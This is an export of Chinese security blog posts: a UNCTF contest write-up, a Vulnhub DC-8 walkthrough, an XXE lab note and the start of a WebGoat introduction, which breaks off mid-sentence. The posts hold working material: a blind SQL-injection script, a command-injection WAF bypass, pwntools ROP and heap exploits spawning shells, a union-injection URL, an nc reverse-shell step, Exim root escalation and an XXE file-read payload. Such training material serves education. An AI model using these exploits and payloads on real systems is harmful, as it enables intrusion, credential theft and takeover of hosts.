[{"title":"UNCTF竞技赛","url":"/2019/10/27/CTF/wp/K&A UNCTF/","content":"\n\n\n\n\n# UNCTF\n\nwp由K&A整理\n\n# WEB\n\n## 简单的备忘录 \n\n[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL Injection)\n\n工具扫没扫出结果 **没得到预期解**\n\n这题应该是出题人的疏忽\n\n先看看可用对象 \n\n```\n{\n    __schema {\n        types {\n            name\n        }\n    }\n}\nquery=\nquery IntrospectionQuery {\n    __schema {\n      queryType { name }\n      mutationType { name }\n      subscriptionType { name }\n      types {\n        ...FullType\n      }\n      directives {\n        name\n        description\n        args {\n          ...InputValue\n        }\n        onOperation\n        onFragment\n        onField\n      }\n    }\n  }\n\n  fragment FullType on __Type {\n    kind\n    name\n    description\n    fields(includeDeprecated: true) {\n      name\n      description\n      args {\n        ...InputValue\n      }\n      type {\n        ...TypeRef\n      }\n      isDeprecated\n      deprecationReason\n    }\n    inputFields {\n      ...InputValue\n    }\n    interfaces {\n      ...TypeRef\n    }\n    enumValues(includeDeprecated: true) {\n      name\n      description\n      isDeprecated\n      deprecationReason\n    }\n    possibleTypes {\n      ...TypeRef\n    }\n  }\n\n  fragment InputValue on __InputValue {\n    name\n    description\n    type { ...TypeRef }\n    defaultValue\n  }\n\n  fragment TypeRef on __Type {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n        }\n      }\n    }\n  }\n\n```\n\n然后查属性 \n\n根据补全和之前的查对象 查数据的时候 查到了flag 写Wp的时候发现是个非预期\n\n```\npayload如下\nquery{\n  allUsers{\n    edges{\n      node{\n        id\n        username\n        memos{\n          edges{\n            node{\n              id\n              private\n              content\n              \n            }\n          }\n        }\n      }\n    }\n  }\n}\n\n```\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/@~JDAMHA3P(0F4(ZXRI7Q9V.hc)\n\n## Checkin\n\n捡来的flag：0e4d1980ef6f8a81428f83e8e1c6e22b【运气题】\n\n啊 NodeJS的题 审计源码只是发现了可以操作的步骤而已。。\n\n关键点是在`/calc `\n\n`/calc __dirname `这种环境变量会有输出的 但是语句就不行 这可怎么办\n\n嗯 关键点还有` NodeJS`的`fs`组件 \n\n`var fs = require('fs');`\n\n `var contentText = fs.readFileSync('123.txt','utf-8');`\n\n然后 执行 `calc require('fs').readFileSync('/flag','utf-8');`\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/ZTS3@T2A7FD2G4AP@@)@151.hc)\n\n## 加密的备忘录[未解出]\n\n这题看着和简单的备忘录 并没有多大区别！ 上一题的payload这一题继续用\n\n当然 第一步都是 先看看可用对象 \n\n```\n{\n    __schema {\n        types {\n            name\n        }\n    }\n}\n\n```\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191027231657.png)\n\n查出来了这么个东西 \n\n`到年种成到定过成个他成会为而时方上而到年到年以可为多为而到可对方生而以年为有到成上可我行到他的面为们方爱`\n\n这是什么加密？？我觉得不是移位，就是乱码。移位没有jio本就算了吧 我试试别的\n\n```\nquery=\nquery IntrospectionQuery {\n    __schema {\n      queryType { name }\n      mutationType { name }\n      subscriptionType { name }\n      types {\n        ...FullType\n      }\n      directives {\n        name\n        description\n        args {\n          ...InputValue\n        }\n        onOperation\n        onFragment\n        onField\n      }\n    }\n  }\n\n  fragment FullType on __Type {\n    kind\n    name\n    description\n    fields(includeDeprecated: true) {\n      name\n      description\n      args {\n        ...InputValue\n      }\n      type {\n        ...TypeRef\n      }\n      isDeprecated\n      deprecationReason\n    }\n    inputFields {\n      ...InputValue\n    }\n    interfaces {\n      ...TypeRef\n    }\n    enumValues(includeDeprecated: true) {\n      name\n      description\n      isDeprecated\n      deprecationReason\n    }\n    possibleTypes {\n      ...TypeRef\n    }\n  }\n\n  fragment InputValue on __InputValue {\n    name\n    description\n    type { ...TypeRef }\n    defaultValue\n  }\n\n  fragment TypeRef on __Type {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n        }\n      }\n    }\n  }\n\n```\n\n这个payload是查属性的 感觉也很通用 但是怎么利用啊！【摔】\n\n## 帮赵总征婚\n\nweb签到题，F12看见注释中有rockyou，此文件为kali自带的密码\n\ngithub上下载其源码，拖进BP爆破(随缘出flag)\n\n## NSB Reset Password\n\n1 跳转到reset3.html页面，更改密码，由于没有验证，直接通过\n\n2 在登录界面登录得到flag\n\n这道题归为运气题，反正就那么出来了\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1572191113.hc)\n\n## superwaf\n\n绕过方法\n\n?a=\\&b=%20%0al\\s%20/%0a\n\npayload:\n\n?a=\\&b=%20%0afi\\nd%20/var/%0a\n\nfind后直接跟path的时候会遍历目录\n\n访问http://101.71.29.5:10054/.F1jh_/h3R3_1S_your_F1A9.txt即可\n\n## easyadmin\n\n```\nimport requests\n\nurl = 'http://101.71.29.5:10049/index.php?file=forget'\nresult = ''\nfor x in range(0, 100):\n    high = 255\n    low = 0\n    mid = (low + high) // 2\n    while high > low:\n        payload = \"1'or if(ascii(substr((password),%d,1))>%d,1,0)#\" % (x, mid)\n        params = {\n            'username':payload\n        }\n        response = requests.post(url, data=params)#,proxies=proxies)\n        if b'hacker' in response.content:\n            print(\"error sql,exit\")\n            exit(0)\n        if b'ok' in response.content:\n            low = mid + 1\n        else:\n            high = mid\n        mid = (low + high) // 2\n    result += chr(int(mid))\n    print(result)\n\n```\n\n密码跑出来是  flag{never_too                                        \n\n用户名admin \n\n登录之后 \n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/XB)OJXJGB3_F1X55%~H6AP1.hc)\n\n\n\nemmm 从隐私模式退出来 \n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1572191405.hc)\n\n抓个包康康\n\n不过。。只能在 yes you are admin 这里 成功 \n\n改referer就好\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1572224349.hc)\n\nflag {never_too_late_to_x}\n\n\n\n# MISC\n\n ## 亲爱的\n\n道题考的是脑洞。\n\n拿到一个mp3文件，使用mp3steg解出来一个flag，可惜是个假的\n\n尝试去播放发现共1.48min,但是只能播放到1.20min多，放到kali去分离一下，得到一个zip文件，打开发现存在一个加密的jpg文件，暴力破解失败，\n\n之后根据qmusic 2019.7.27 17:47 去搜索，大概翻了1000多条终于找到对应的评论--`真的上头` 得到密码\n\n拿到一个二次元图片，符合最近赵总的情况（偷笑）,图片比较大，修改后缀为zip，之后在image1.png找到flag\n\n## Hidden secret\n\n1 附件得到3个文件\n\n2 通过winhex 将文件内容顺序以Hex方式写入，生成一个新的文件\n\n3 通过binwalk -e 文件 得到一个压缩包，使用rar修复，解压出1.jpg和2.txt ，提示1.txt包含在1.jpg中\n\nhint:NTFS\n\n最后一天题目改了，不是很懂鸭\n\n将123的文件加上50 4B\n\n然后将其HEX数据全部放到一个文件中，改后缀zip\n\n解压后得图片，再得压缩包，最后是\n\nK<jslc7b5'gBA&]_5MF!h5+E.@IQ&A%EExEzp\\\\X#9YhiSHV#\n\n是BASE92编码（白费我1块钱）\n\n写脚本得\n\n`cca1a567c3145b1801a4f3273342c622`\n\n## 快乐的游戏题 \n\n真的是快乐的游戏题呢.... 玩了一下就出来了 \n\nflag c783910550de39816d1de0f103b0ae32\n\n6步出结果，这道题真的就是玩。\n\n\n\n# CRYPTO\n\n## 666\n\n将附件放到IDA里面进行分析，里面发现有encode，main函数部分，在main函数里面有比较flag的部分，那就先要将字符串通过encode函数反推到原本的字符串里面去。异或对称脚本完事。\n\n补充脚本 嘿嘿\n\n```\nkey=18\nenflag=r'izwhroz\"\"w\"v.K\".Ni'\n\nflag=\"\"\ni=0\n\nwhile (i<16):\n    print(chr((ord(enflag[i])^ 18) -6),end=\"\")\n    print(chr((ord(enflag[i+1]) ^ 18) + 6),end=\"\")\n    print(chr(ord(enflag[i+2]) ^ 18 ^ 6 ),end=\"\")\n    i +=3\n\nprint(flag)\n\n```\n\n## 不仅仅是RSA\n\n里面含有两个wav文件，两个公钥（public1(2).pem),以及一个RSA.py。\n\n首先解决两个wav文件，打开稍微试听一下基本可以确定是摩斯电码。放到在线网站去解（\n\nhttps://morsecode.scphillips.com/labs/audio-decoder-adaptive/?tdsourcetag=s_pcqq_aiomsg\n\n），发现解出来是c1，c2（估计是flag中间一半划开）\n\n在去解决公钥，使用openssl工具（或者在线解析网站）将公钥里面的e和n算出来，再到大素数在线网站去解决n（得到p，q），再使用RSA求m脚本解出m。\n\n```\nimport libnum\nimport gmpy2\n\nn=\ne=65537\np = 386123125371923651191219869811293586459\nq = 189239861511125143212536989589123569301\nassert n==p*q\n\nc=15116717704501623028903918131505510580599561357387431295289012193980554012811\nd=gmpy2.invert(e,(p-1)*(q-1))\nm=pow(c,d,n)\nprint libnum.n2s(m)\n```\n\n## 一句话加密\n\n将附件里面的图片放到winhex里面结尾有一段16进制的数字，那个为n\n\n用c1 得到flag的前半部分，c2得到后半部分\n\n直接上脚本：\n\n```\nimport gmpy2\n\ndef n2s(num):\n\tt = hex(num)[2:]\n\tif len(t) % 2 == 1:\n\t\treturn ('0'+t).decode('hex')\n\treturn t.decode('hex')\n\nc = 62501276588435548378091741866858001847904773180843384150570636252430662080263\np = 275127860351348928173285174381581152299\nq = 319576316814478949870590164193048041239\nn = p*q\nr = pow(c,int((p+1)/4),p)\ns = pow(c,int((q+1)/4),q)\na = gmpy2.invert(p,q)\nb = gmpy2.invert(q,p)\nx =(a*p*s+b*q*r)%n\ny =(a*p*s-b*q*r)%n\n\nprint n2s(x%n)\nprint n2s((-x)%n)\nprint n2s(y%n)\nprint n2s((-y)%n)\n\nunctf{412a1ed6d21e55191ee5131f266f5178}\n\n```\n\n\n\n# REVERSE\n\n## 奇怪的数组\n\n本题为32位PE文件，无壳无花。有符号表\n\nIDA载入，main函数F5\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191027232649.png)\n\n很明显要求输入格式flag{xxxxx}，且xxxxx为32位\n\n下面做16轮判断，v10为v11高位\n\n查看char2hex\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191027232724.png)\n\n要求输入为0-9或a-f，将其转换成hex对应的0-9和a-f\n\nV9为高低位拼接，其实就是将输入分成两位一组，比如输入3a，则v9=0x3a\n\n然后和box比较\n\nbox=[ 0xAD,0x46, 0x1E,0x20, 0x3C,0x79, 0x75,0xB3, 0x5E,0x52, 0x79,0x60, 0xCB,0xFE, 0xB0,0x6C]\n\n因此很明显输入是ad461e203c7975b35e527960cbfeb06c即可\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/clip_image002.gif)\n\n\n\n## easy_Maze\n\n很简单的迷宫\n\n开局push初始迷宫数据\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191028090321.png)\n\nStep0,step1对迷宫做混淆，v5回调，step2输入走迷宫\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191028090342.png)\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191028090353.png)\n\n看到迷宫只要走到右下角数组坐标v5[6][6]即可\n\nIDA直接远程调试，看v5\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191028090407.png)\n\nSsddwdwdddssaasasaaassddddwdds\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191028090425.png)\n\n# PWN\n\n## soso easy pwn\n\n栈空间复用，因为开了pie，所以爆破就玩事儿\n\nUNCTF{S0_so_E4zy_Pwn}\n\n脚本一：\nauto 爆破：\n\n```\nfrom pwn import *\nimport binascii\ncontext.log_level = 'debug'\n\nelf = ELF('./x86_libc.so.6')\noffset = 12\ni = 0\n\nwhile True:\n\ti += 1\t\n\tprint i\t\n\tsh = process('./pwn')\n\t#sh = remote('101.71.29.5',10000)\t\n\tsh.recvuntil('the ')\n\t#sh.recvuntil('\\x32')\n\tbase = int(sh.recv(5)) << 16\n\tprint hex(base)\n\tsh.recvuntil('name?\\n')\t\n\tpayload = 'a'*offset\n\t#addr = base + random.sample(list1,1)[0]\t\n\tpayload += p32(base+0x59d6)\n\tsh.send(payload)\n\tsh.recvuntil('(1.hello|2.byebye):\\n')\n\tsh.send('0')\n\ttry:\t\t\n\t\tsh.recv(timeout = 1)\n\t\t\n\texcept Exception as e:\n\t\tsh.close()\n\t\tcontinue\n\telse:\n\t\tsleep(0.1)\n\t\tsh.interactive()\n\n```\n\n脚本二：\n\n穷苦人士，不会写循环，就手工\n\n```\nfrom pwn import *\ncontext.log_level = 'debug'\nelf = ELF('./x86_libc.so.6')\n\\#p = process('./pwn')\noffset = 12\n\np = remote('101.71.29.5',10000)\np.recvuntil('our the ')\nbase_addr = int(p.recv(5)) << 16\nprint hex(base_addr)\np.recvuntil('name?\\n')\t\npayload = 'c'*offset\t\npayload += p32(base+0x69cd)\np.send(payload)\np.recvuntil('byebye):\\n')\np.send('0')\np.interactive()\n```\n\n## baby rop\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191027234103.png)\n\n好了，栈迁移 + one_gadget！\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\ncontext.log_level = 'debug'\nsh = process('./babyrop')\nsh = remote('101.71.29.5',10041)\nelf = ELF('./babyrop')\nlibc = ELF('./libc6-i386_2.23-0ubuntu10_amd64.so')\n\nread_plt = elf.plt['read']\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\nread_got = elf.got['read']\nmain_addr = 0x08048592\npop_ret = 0x080483b5\npop3_ret = 0x08048659\nleave_ret = 0x08048468\nbuf = elf.bss() + 0x500\nbuf2 = elf.bss() + 0x400\n\nsh.recvuntil('\\n')\npayload = 'a'*0x20 + p32(1717986918)\nsh.sendline(payload)\nsh.recvuntil('name?\\n')\npayload = 'a'*0x14  + p32(puts_plt)+p32(pop_ret) + p32(puts_got) + p32(0x0804853D)\nsh.sendline(payload)\naddr = u32(sh.recvuntil('\\xf7')[-5:])\n\nbase = addr - libc.symbols['puts']\nsystem_addr = base + libc.symbols['system']\nbinsh = base + libc.search('/bin/sh\\x00').next()\nsleep(0.1)\nsh.recvuntil('name?\\n')\npayload = 'a'*0x10 + p32(0x0804A020) + p32(read_plt) + p32(leave_ret) + p32(0) + p32(0x0804A020) + p32(0x20)\nsh.sendline(payload)\nsleep(0.1)\n\npayload = p32(0x0804A080)\npayload += p32(read_plt)\npayload += p32(leave_ret) \npayload += p32(0)\npayload += p32(0x0804A080)\npayload += p32(40)\nsh.sendline(payload.ljust(39-8,'a'))\n\npayload = 'aaaa'\npayload += p32(base +0x3a819 )\nsh.sendline(payload)\n\nlog.success('system =' + hex(system_addr))\nlog.success('binsh =' + hex(binsh))\n\nsh.interactive()\n\nUNCTF{7ef293810e29039f061982e72fd10bfb}\n\n```\n\n## EasyShellCode\n\n只能说V爷爷太强了，用V爷爷的ae64脚本https://github.com/veritas501/ae64\n\n改一下他现成得exp即可\n\n\n\n这题的限制条件也就是base64，只是通过if展示罢了。\n\n```\nfrom pwn import *\nfrom ae64 import AE64 \n\ncontext.log_level = 'debug'\ncontext.arch = 'amd64'\np = remote('101.71.29.5',10080)\nobj = AE64()\nsc = obj.encode(asm(shellcraft.sh()))\np.sendline(sc)\np.interactive()\nUNCTF{x64_A5c11_shE11c0dE_i5_50_Ea5y}\n```\n\n## orwheap\n\n```\nfrom pwn import *\ncontext.log_level = 'debug'\ncontext.arch = 'amd64'\nsh = remote('101.71.29.5', 10005)\nelf = ELF('pwn')\nlibc = ELF('./x64_libc.so.6')\n\n\ndef add(size, content):\n    sh.sendlineafter('Your Choice: ', '1')\n    sh.sendlineafter(': ', str(size))\n    sh.sendafter(': ' , content)\n\ndef delete(index):\n    sh.sendlineafter('Your Choice: ', '2')\n    sh.sendlineafter(': ', str(index))\n\ndef edit(index, content):\n    sh.sendlineafter('Your Choice: ', '3')\n    sh.sendlineafter(': ', str(index))\n    sh.sendafter(': ' , content)\n\nadd(0x68, '\\n')\nadd(0x78, '\\n')\nadd(0x68, (p64(0) + p64(0x21)) * 6 + '\\n')\nadd(0x68, (p64(0) + p64(0x21)) * 6 + '\\n')\ndelete(0)\nadd(0x68, 'a' * 0x60 + p64(0) + p8(0xf1))\ndelete(1)\ndelete(2)\nadd(0x78, '\\n')\n\ndelete(0)\nadd(0x68, 'a' * 0x60 + p64(0) + p8(0xa1))\ndelete(1)\nadd(0x98, '\\n')\nedit(1, 'b' * 0x70 + p64(0) + p64(0x71) + p16(0x55dd))\n\nadd(0x68, '\\n')\nadd(0x68, 'c' * 0x33 + p64(0xfbad2887 | 0x1000) + p64(0) * 3 + '\\n')\nsh.recvn(0x88)\nlibc_addr = u64(sh.recvn(8)) - libc.symbols['_IO_2_1_stdin_']\nlog.success('libc_addr: ' + hex(libc_addr))\n\nedit(1, 'b' * 0x70 + p64(0) + p64(0x91))\ndelete(2)\nedit(1, 'b' * 0x70 + p64(0) + p64(0x91) + p64(0) + p64(libc_addr + \nlibc.symbols['__free_hook'] - 0x20))\nadd(0x88, '\\n')\n\nedit(1, 'b' * 0x70 + p64(0) + p64(0x71))\ndelete(2)\nedit(1, 'b' * 0x70 + p64(0) + p64(0x71) + p64(libc_addr + \nlibc.symbols['__free_hook'] - 0x13))\n\nframe = SigreturnFrame()\nframe.rdi = 0\nframe.rsi = (libc_addr + libc.symbols['__free_hook']) & 0xfffffffffffff000 #\nframe.rdx = 0x2000\nframe.rsp = (libc_addr + libc.symbols['__free_hook']) & 0xfffffffffffff000 \nframe.rip = libc_addr + 0x00000000000bc375 #: syscall; ret;    --> rcx\npayload = str(frame)\nadd(0x68, payload[0x80:0x80 + 0x60] + '\\n')\nadd(0x68, 'fff' + p64(libc_addr + libc.symbols['setcontext'] + 53) + '\\n')\n'''\n<setcontext+53>:  mov    rsp,QWORD PTR [rdi+0xa0]\n<setcontext+60>:  mov    rbx,QWORD PTR [rdi+0x80]\n<setcontext+67>:  mov    rbp,QWORD PTR [rdi+0x78]\n<setcontext+71>:  mov    r12,QWORD PTR [rdi+0x48]\n<setcontext+75>:  mov    r13,QWORD PTR [rdi+0x50]\n<setcontext+79>:  mov    r14,QWORD PTR [rdi+0x58]\n<setcontext+83>:  mov    r15,QWORD PTR [rdi+0x60]\n<setcontext+87>:  mov    rcx,QWORD PTR [rdi+0xa8]\n<setcontext+94>:  push   rcx\n<setcontext+95>:  mov    rsi,QWORD PTR [rdi+0x70]\n<setcontext+99>:  mov    rdx,QWORD PTR [rdi+0x88]\n<setcontext+106>: mov    rcx,QWORD PTR [rdi+0x98]\n<setcontext+113>: mov    r8,QWORD PTR [rdi+0x28]\n<setcontext+117>: mov    r9,QWORD PTR [rdi+0x30]\n<setcontext+121>: mov    rdi,QWORD PTR [rdi+0x68]\n<setcontext+125>: xor    eax,eax\n<setcontext+127>: ret  \n'''\n\nprint hex(u64(payload[0xa8:0xa8+8]))\n\nedit(1, payload[:0x98])\n\ndelete(1)\n\nlo = [\n    libc_addr + 0x0000000000021102, #: pop rdi; ret; \n    (libc_addr + libc.symbols['__free_hook']) & 0xfffffffffffff000,\n    libc_addr + 0x00000000000202e8, #: pop rsi; ret; \n    0x2000,\n    libc_addr + 0x0000000000001b92, #: pop rdx; ret; \n    7,\n    libc_addr + 0x0000000000033544, #: pop rax; ret; \n    10,\n    libc_addr + 0x00000000000bc375, #: syscall; ret; \n    libc_addr + 0x0000000000002a71, #: jmp rsp; \n]\n\nshellcode = asm('''\nsub rsp, 0x800\npush 0x67616c66\nmov rdi, rsp\nxor esi, esi\nmov eax, 2\nsyscall\n\ncmp eax, 0\njs failed\n\nmov edi, eax\nmov rsi, rsp\nmov edx, 0x100\nxor eax, eax\nsyscall\n\nmov edx, eax\nmov rsi, rsp\nmov edi, 1\nmov eax, edi\nsyscall\n\njmp exit\n\nfailed:\npush 0x6c696166\nmov edi, 1\nmov rsi, rsp\nmov edx, 4\nmov eax, edi\nsyscall\n\nexit:\nxor edi, edi\nmov eax, 231\nsyscall\n''')\nsh.send(flat(lo) + shellcode)\n\nsh.interactive()\nclear()\n\n```\n\n","tags":["CTF"],"categories":["CTF"]},{"title":"Vulnhub DC-8","url":"/2019/10/21/靶机/Vulnhub-DC-8/","content":"\n\n\n# vulnhub-dc8\n\n## 0x00 下载地址\n\n[DC-8](http://www.five86.com/dc-8.html)\n\n## 0x01 环境\n\nkali：192.168.64.133\n\ndc-8：192.168.64.155\n\n## 0x02 复现\n\n1. 扫描端口\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191020221007.png)\n\n2. 查看网站，查找有用信息\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191020224511.png)\n\n   发现在访问时url处为nid=1 这种类型，可能存在sql注入，测试发现报错\n\n3. 获取用户名和密码\n\n   字段为1 \n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021093629.png)\n\n   数据库 `d7db`\n\n   `http://192.168.64.155/?nid=-1%20union%20all%20select%20database()%20--+`\n\n   拿到用户名和密码\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021094308.png)\n\n   使用john破解\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021095827.png)\n\n   接下来通过之前扫描的的信息中获取到的登录界面登录\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021095720.png)\n\n4. 登录后台\n\n   和dc-7 一样，寻找可以执行php语句的地方\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021103459.png)\n\n   测试执行语句，在`form settings`写入phpinfo\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021103916.png)\n\n5. 反弹shell\n\n   尝试反弹shell\n\n   kali `nc -lvvp 4444`\n\n   web页面处\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021104353.png)\n\n   kali处成功监听，获取交互式shell\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021104646.png)\n\n6. 信息收集\n\n   通过vps下载linenum 去获取服务器信息\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021105414.png)\n\n   这里尝试一下 sudo提权，需要密码 ，版本没有类似的漏洞，\n\n   之后在suid处存在一处可疑文件，查看版本，发现存在可利用漏洞\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021110950.png)\n\n7. 提权\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021111447.png)\n\n   利用此漏洞尝试提权\n\n   查看使用方式：https://www.exploit-db.com/exploits/46996\n\n   尝试利用`./46996.sh -m setuid`或`./46996.sh -m netcat` 提权\n\n   报错：\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021112142.png)\n\n   搜索发现这个报错是由于windows下编辑上传到linux下执行导致的\n\n   解决方法\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021113723.png)\n\n   成功获取root权限\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021113857.png)\n\n   cd到root下 查看flag\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021113941.png)","tags":["exim提权"],"categories":["靶机"]},{"title":"xxe demo 练习","url":"/2019/10/14/web安全/XXE/xxe-lab/","content":"\n[TOC]\n\n# xxe练习\n\n## 0x00 xxe 介绍\n\nXXE漏洞全称XML External Entity Injection 即xml外部实体注入漏洞，XXE的漏洞发生在应用程序解析xml输入时，没有禁止外部实体加载而产生的`任意文件读取`,`远程命令执行`，`内网端口扫描`，`dos攻击`等危害。\n\n要了解xxe 需要先了解 `xml` 和 `dtd` , xml是一种可扩展标记性语言 和`html`比较相似，但是`xml` 是独立于软件和硬件的信息传输工具， `html`是用来显示数据的，`dtd` 是用来声明`xml`的内容格式规范的。\n\n**xml的文档实例**\n\n```\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<note>//根元素\n<to>George</to>// 四个子元素\n<from>John</from>\n<heading>Reminder</heading>\n<body>Don't forget the meeting!</body>\n</note> //根元素结尾\n```\n\n**DTD**\n\n`DTD`的租用是定义`xml`的合法构建模块，`DTD`可被成行声明`xml`文档中，也可作为一个外部引用。\n\n内部DTD声明\n\n```\n<!DOCTYPE 根元素 [元素声明]>\n```\n\n外部DTD声明\n\n```\n<!DOCTYPE 根元素 SYSTEM \"文件名\">\n```\n\n\n\n## 0x01 xxe demo 学习\n\n初次了解xxe，从网上找到了一个demo，下载下来尝试练习\n\n## 0x02安装\n\n下载源码后，放到phpstudy下即可，作者为了适合大家的环境，特定准备了4种环境：php，java，python，c#\n\n## 0x03 分析源码\n\n```php\n<?php\n/**\n* autor: c0ny1\n* date: 2018-2-7\n*/\n\n$USERNAME = 'admin'; //账号\n$PASSWORD = 'admin'; //密码\n$result = null;\n\nlibxml_disable_entity_loader(false);// 这里可以引用外部实体，在正常情况需要改为true，放置xxe的出现\n$xmlfile = file_get_contents('php://input');// 通过php伪协议获取我们发送的xml文档\n\ntry{\n\t$dom = new DOMDocument();// 创建xml对象\n\t$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n\t$creds = simplexml_import_dom($dom);//函数把 DOM 节点转换为 SimpleXMLElement 对象。\n\n\t$username = $creds->username;\n\t$password = $creds->password;\n\n\tif($username == $USERNAME && $password == $PASSWORD){\n\t\t$result = sprintf(\"<result><code>%d</code><msg>%s</msg></result>\",1,$username);//判断通过输出username,这里也是控制的关键，需要通过username去返回其他内容\n\t}else{\n\t\t$result = sprintf(\"<result><code>%d</code><msg>%s</msg></result>\",0,$username);\n\t}\t\n}catch(Exception $e){\n\t$result = sprintf(\"<result><code>%d</code><msg>%s</msg></result>\",3,$e->getMessage());\n}\n\nheader('Content-Type: text/html; charset=utf-8');\necho $result;\n?>\n```\n\n## 0x04 漏洞复现\n\n打开主页\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191014165841.png)\n\n抓包 ，构造payload， 发包\n\n```\n<?xml version=\"1.0\"?> // 这一句可以省略\n<!DOCTYPE a[\n<!ENTITY test SYSTEM \"file:///c:/windows/win.ini\">\n]>\n```\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191014170004.png)\n\n一个简单的xxe漏洞就出现了\n\n","tags":["XXE"],"categories":["WEB安全"]},{"title":"OWASP WebGoat 学习","url":"/2019/10/06/web安全/OWASP/2019-10-6-OWASP-WebGoat-学习/","content":"\n[TOC]\n\n# WebGoat\n\n## 0x00介绍\n\nWebGoat是一个用于讲解典型web漏洞的基于J2EE架构的web应用，他由著名的WEB应用安全研究组织OWASP精心设计并不断更新，目前版本已经到了8.0，\n\n其中包括：跨站点脚本攻击（XSS）、访问控制、线程安全、操作隐藏字段、操纵参数、弱会话cookie、SQL盲注、数字型SQL注入、字符串型SQL注入、web服务、Open Authentication失效、危险的HTML注释等等。WebGoat提供了一系列web安全学习的教程，准确提供存在的漏洞，适合初学者去查阅资料学习\n\n`github`地址：[WebGoat](https://github.com/WebGoat/WebGoat)\n\n## 0x01环境搭建\n\n打开了尘封的`OWASP Broken Web Apps` 版本才更新到4.5 搜索了下相关的资料，搭建一个最新版的环境去练习，搜素发现可以使用`docker`搭建，那么直接上手，节省搭建的大量时间。\n\n```\ndocker search webgoat\n```\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191006135511.png)\n\n拉取容器\n\n```\ndocker pull webgoat/webgoat-8.0\n```\n\n![1570341403882](D:\\Blog\\ST0new.github.io\\source\\_posts\\web安全\\OWASP\\2019-10-6-OWASP-WebGoat-学习.assets\\1570341403882.png)\n\n将下载好的容器映射到本地端口就可以直接访问了\n\n```\ndocker run -p 80:80 -t webgoat/webgoat-8.0\n```\n\n![](D:\\Blog\\ST0new.github.io\\source\\_posts\\web安全\\OWASP\\2019-10-6-OWASP-WebGoat-学习.assets\\20191006135956.png)\n\n等待完成即可通过本地`ip`登录开始学习之旅\n\n## 0x02WebGoat学习\n\n安装成功，注册账号\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191006141532.png)\n\n赶快开始吧\n\n### 0x03Introduction\n\n### What is WebGoat？\n\n> ?WebGoat是一个故意不安全的应用程序，它允许感兴趣的开发人员(就像您一样)测试基于java的应用程序中常见的漏洞，这些应用程序使用常见和流行的开放源码组件现在,我们绝不容忍造成故意伤害任何动物,山羊或否则,我们认为所有你能了解安全漏洞是必不可少的理解就会发生什么即使是很小的一些意想不到的代码进入应用程序更好的方法来做什么,而不是你自己的替罪羊?你愿意和他做什么就做什么。劈呀，戳呀，戳呀，如果这能让你好受些，那就吓吓他，直到你心满意足为止。去吧，把goat砍下来。我保证他喜欢。 (来自有道翻译)\n\n### Webwolf\n\n>You only need WebWolf if a lesson specifies you can use it. For a lot of lessons you use WebGoat without starting WebWolf. If you need to do an exercise with WebWolf make sure it is running along side WebGoat. Lessons where you can use WebWolf are marked with the following icon (top right in assignment):\n>\n>你只需要网络狼，如果一个教训指定你可以使用它。在很多课程中，你使用WebGoat而不是WebWolf。如果你需要做一个练习与网络狼，确保它是沿着侧网羊。可以使用WebWolf的课程使用如下图标(作业右上角):\n>\n>Even if the icon is present your are not obliged to use WebWolf, you can also use any intercepting tool you like. (`netcat` etc.)\n>\n>即使图标出现了，你也不必使用WebWolf，你也可以使用任何你喜欢的拦截工具。(netcat等等)。\n>\n>WebWolf is a separate web application which simulates an attackers machine. It makes it possible for us to make a clear distinction between what takes place on the attacked website and the actions you need to do as an \"attacker\". WebWolf was introduced after a couple of workshops where we received feedback that there was no clear 